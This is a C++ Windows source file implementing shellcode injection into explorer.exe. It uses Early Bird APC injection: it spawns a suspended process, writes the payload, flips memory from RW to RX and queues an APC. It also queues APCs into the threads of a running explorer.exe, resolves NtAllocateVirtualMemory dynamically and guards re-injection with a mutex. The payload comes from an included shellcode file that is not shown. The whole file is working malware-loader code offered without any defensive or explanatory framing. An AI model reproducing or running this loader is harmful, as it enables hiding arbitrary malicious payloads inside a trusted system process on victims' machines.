#define _WIN32_IE 0x0400

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdio.h>
#include <shlobj.h>
#include <vector>

#include <tlhelp32.h>
#include "Shellcode.inc"

#define MAX_FILEPATH	255

#define KEY "Password"

typedef NTSYSAPI NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
	HANDLE ProcessHandle,
	PVOID* BaseAddress,
	ULONG_PTR ZeroBits,
	PSIZE_T RegionSize,
	ULONG AllocationType,
	ULONG Protect
	);

bool DirectoryExists(const char* DirectoryPath)
{
	DWORD Attr = GetFileAttributes(DirectoryPath);
	return ((Attr != 0xFFFFFFFF) && ((Attr & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY));
}

char* StrChar(const char* p, int ch)
{
	union {
		const char* cp;
		char* p;
	} u;
	u.cp = p;
	for (;; ++u.p)
	{
		if (*u.p == ch) return u.p;
		if (*u.p == '\0') return NULL;
	}
}

bool ForceDirectories(const char* Path)
{
	char* pp, * sp, PathCopy[1024];
	if (strlen(Path) >= sizeof(PathCopy)) return false;
	strncpy(PathCopy, Path, sizeof(PathCopy));

	char Delimiter = '\\';

	bool Created = true;
	pp = PathCopy;
	while (Created && (sp = StrChar(pp, Delimiter)) != NULL)
	{
		if (sp != pp)
		{
			*sp = '\0';
			if (!DirectoryExists(PathCopy)) Created = CreateDirectory(PathCopy, NULL);
			*sp = Delimiter;
		}
		pp = sp + 1;
	}
	return Created;
}



char CharToUpper(char c)
{
	return ((c < 123 && c > 96) ? (c - 32) : c);
}

int StrCaseCompare(char* Str1, char* Str2)
{
	if (Str1 == NULL || Str2 == NULL) return -1;
	char* s1 = Str1, * s2 = Str2;

	while (*s1 != '\0' && *s2 != '\0')
	{
		if (CharToUpper(*s1++) != CharToUpper(*s2++)) return -1;
	}
	if (*s1 != *s2) return -1;
	else return 0;
}

DWORD GetProcessIdFromName(char* ProcessName)
{
	PROCESSENTRY32 ProcessEntry;
	HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

	ProcessEntry.dwSize = sizeof(ProcessEntry);
	if (!Process32First(hProcessSnap, &ProcessEntry))
	{
		CloseHandle(hProcessSnap);          // clean the snapshot object
		return 0;
	}

	do
	{
		if (StrCaseCompare(ProcessName, ProcessEntry.szExeFile) == 0)
		{
			CloseHandle(hProcessSnap);
			return ProcessEntry.th32ProcessID;
		}
	} while (Process32Next(hProcessSnap, &ProcessEntry));
	CloseHandle(hProcessSnap);
	return 0;
}

HANDLE InjectShellcode(HANDLE hProcess, unsigned char* Shellcode, int ShellcodeLen)
{
	DWORD BytesWritten, TID;
	LPVOID pThread = VirtualAllocEx(hProcess, NULL, ShellcodeLen, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (pThread != NULL) WriteProcessMemory(hProcess, pThread, Shellcode, ShellcodeLen, &BytesWritten);
	HANDLE ThreadHandle = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pThread, NULL, 0, &TID);
	return ThreadHandle;
}

BOOL EarlyBird(unsigned char payload[], SIZE_T payloadSize) {
	LPPROCESS_INFORMATION procInfo = new PROCESS_INFORMATION();
	LPSTARTUPINFOA startInfo = new STARTUPINFOA();
	LPVOID baseAddress = { 0 };
	DWORD oldProtect;
	NTSTATUS status;
#ifdef _WIN64
	LPSTR targetExe = (LPSTR)"C:\\Windows\\System32\\explorer.exe";
#else
	LPSTR targetExe = (LPSTR)"C:\\Windows\\SysWow64\\explorer.exe";
#endif

	// Creating target process in suspended mode
	wprintf(L"[+] Creating target process in suspended mode... \n");
	if (!CreateProcessA(NULL, (LPSTR)targetExe, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, startInfo, procInfo)) {
		wprintf(L"[-] Error creating process in suspended mode: %d\n", GetLastError());
		exit(-1);
	}
	// Allocating memory in remote process with protection PAGE_READWRITE
	wprintf(L"[+] Allocate memory in target process...\n");
	baseAddress = VirtualAllocEx(procInfo->hProcess, NULL, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!WriteProcessMemory(procInfo->hProcess, baseAddress, payload, payloadSize, NULL)) {
		wprintf(L"[-] Error writing payload into the remote rocess... \n");
		exit(-1);
	}
	wprintf(L"[+] Memory allocated at address: %p \n", baseAddress);
	// Changing memory protection of allocated memory from PAGE_READWRITE to PAGE_EXECUTE_READ
	wprintf(L"[+] Changing memory protection RW -> RX\n");
	if (!VirtualProtectEx(procInfo->hProcess, baseAddress, payloadSize, PAGE_EXECUTE_READ, &oldProtect)) {
		wprintf(L"[-] Error changing memory protection... \n");
		exit(-1);
	}
	// Setting up the routine (APC routine)
	LPTHREAD_START_ROUTINE tRoutine = (LPTHREAD_START_ROUTINE)baseAddress;
	// Put our payload/APC function in queue 
	wprintf(L"[+] Puting our payload in queue....\n");
	QueueUserAPC((PAPCFUNC)tRoutine, procInfo->hThread, 0);
	// Resume the thread
	wprintf(L"[+] Resuming Thread....\n");
	ResumeThread(procInfo->hThread);
	Sleep(1000 * 2);
	return TRUE;
}

HANDLE InjectShellcodeAPC(HANDLE hProcess, std::vector<DWORD>& tids, unsigned char* Shellcode, int ShellcodeLen)
{
	HANDLE hThread;
	//MessageBox(NULL, "Start EarlyBird", "Check1", MB_ICONERROR);
	BOOL isSuccess = EarlyBird(Shellcode, ShellcodeLen);
	if (isSuccess) {
		wprintf(L"Done..!!");
	}
	else {
		perror("[-] Error executing early bird...\n");
	}
	DWORD oldProtect;
	_NtAllocateVirtualMemory pNtAllocateVirtualMemory = (_NtAllocateVirtualMemory)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");
	PVOID baseAddress = { 0 };
	SIZE_T allocSize = ShellcodeLen;
	pNtAllocateVirtualMemory(hProcess, &baseAddress, 0, &allocSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	WriteProcessMemory(hProcess, baseAddress, Shellcode, ShellcodeLen, NULL);
	VirtualProtectEx(hProcess, baseAddress, ShellcodeLen, PAGE_EXECUTE_READ, &oldProtect);
	unsigned char buffer[10] = { 0 };
	SIZE_T bytesRead;
	ReadProcessMemory(hProcess, baseAddress, buffer, sizeof(buffer), &bytesRead);

	wchar_t message[256];
	wchar_t bufferHex[21]; // 10 bytes * 2 characters per byte + 1 for null terminator
	for (int i = 0; i < 10; ++i) {
		swprintf(&bufferHex[i * 2], 3, L"%02X", buffer[i]);
	}

	swprintf(message, sizeof(message) / sizeof(wchar_t), L"Shellcode injected at: 0x%p\nFirst 10 bytes: %s", baseAddress, bufferHex);
	//MessageBoxW(NULL, message, L"APC Injection", MB_OK);

	PTHREAD_START_ROUTINE tRoutine = (PTHREAD_START_ROUTINE)baseAddress;
	for (DWORD tid : tids) {
		wchar_t tidMessage[256];
		swprintf(tidMessage, L"Processing thread with ID: %lu", tid);
		//MessageBoxW(NULL, tidMessage, L"Thread Processing", MB_OK);
		hThread = OpenThread(THREAD_ALL_ACCESS, TRUE, tid);
		QueueUserAPC((PAPCFUNC)tRoutine, hThread, 0);
		Sleep(1000);
	}
	//MessageBoxW(NULL, L"return handler", L"return", MB_OK);
	return hThread;
}

bool ShellcodeInjected()
{
	HANDLE hMutex = OpenMutex(MUTEX_ALL_ACCESS, false, "SHELLCODE_MUTEX");
	if (hMutex == NULL)
	{
		return false;
	}
	else
	{
		CloseHandle(hMutex);
		return true;
	}
}

BOOL FindTargetProcess(wchar_t* exe, DWORD& pid, std::vector<DWORD>& vTids) {
	HANDLE hSnapshot = INVALID_HANDLE_VALUE;
	PROCESSENTRY32 pe32 = { sizeof(PROCESSENTRY32) };
	//pe32.dwSize = sizeof(PROCESSENTRY32);
	THREADENTRY32 te32 = { 0 };
	te32.dwSize = sizeof(THREADENTRY32);

	// Create Snapshots of the processes and threads
	hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, NULL);
	// Retrieve the information about the first process in snapshot
	if (Process32First(hSnapshot, &pe32)) {
		do {
			wchar_t wExeFile[MAX_PATH];
			MultiByteToWideChar(CP_ACP, 0, pe32.szExeFile, -1, wExeFile, MAX_PATH);
			// Compare if the process in snapshot is our target process
			if (_wcsicmp(wExeFile, exe) == 0) {
				pid = pe32.th32ProcessID;
				wprintf(L"[+] Found Process: %s \n", exe);
				wprintf(L"[+] Process id: %d \n", pe32.th32ProcessID);
				if (Thread32First(hSnapshot, &te32)) {
					do {
						// if thread's owner id is equal to our target process id
						// then store the thread id
						if (te32.th32OwnerProcessID == pe32.th32ProcessID) {
							vTids.push_back(te32.th32ThreadID);
						}
					} while (Thread32Next(hSnapshot, &te32));
				}
				return TRUE;
			}
			// retrieve the next process information if current 
			// process name in snapshot do not match with our target process
		} while (Process32Next(hSnapshot, &pe32));
	}
	return TRUE;
}

void InitiateMonitoringThread()
{
	CreateMutex(NULL, 0, "7YhngylKo09H");
	if (!(ShellcodeInjected()))
	{
		DWORD ProcessId;
		wchar_t exeName[] = L"explorer.exe";

		std::vector<DWORD> tids;
		FindTargetProcess(exeName, ProcessId, tids);
		HANDLE hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, false, ProcessId);
		if (hProcess != 0)
		{

			//HANDLE HinjectionThread = InjectShellcodeAPC(hProcess, tids, MsgShellCode, (sizeof(MsgShellCode)));
			HANDLE HinjectionThread = InjectShellcodeAPC(hProcess, tids, mthread, sizeof(mthread));

			if (HinjectionThread != NULL)
			{
				//MessageBoxW(NULL, L"Injection Successful", L"Injection Status", MB_OK | MB_ICONINFORMATION);
			}
			else
			{
				//MessageBoxW(NULL, L"Injection Failed", L"Injection Status", MB_OK | MB_ICONERROR);
			}

		}
	}
}